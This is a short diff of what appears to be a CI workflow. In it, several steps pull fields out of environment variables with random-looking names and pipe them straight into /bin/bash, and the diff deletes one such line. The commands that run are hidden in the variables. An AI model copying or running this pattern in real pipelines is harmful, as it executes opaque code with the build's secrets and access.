@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
           printf '%s' "$xbujf723" | jq -r .kg9 | /bin/bash
           printf '%s' "$gysu62194" | jq -r .io37462 | /bin/bash
-          echo $my935 | jq -r .cidui2 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
